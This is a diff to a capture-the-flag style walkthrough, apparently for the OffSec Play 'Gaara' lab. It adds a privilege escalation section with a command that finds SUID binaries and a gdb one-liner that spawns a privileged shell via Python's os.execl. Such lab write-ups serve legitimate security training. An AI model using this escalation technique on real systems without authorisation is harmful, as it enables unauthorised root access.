@@ -228,7 +228,18 @@ gaara
 uid=1001(gaara) gid=1001(gaara) groups=1001(gaara)
 ```
 
+Privilege Escalation
 
+List files that have the SUID bit set
 ```
 gaara@Gaara:~$ find / -perm -4000 -type f -exec ls -al {} \; 2>/dev/null
 ```
+![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/ffef96d8-8d9c-4a42-8377-ad02ef66ec96)
+
+![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/38fe55f1-b0d9-43d7-9131-47c350af10fb)
+
+Execute
+```
+gaara@Gaara:~$ gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
+```
+![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/65f784cd-e6f5-4b8e-b046-03d9a923fb2b)
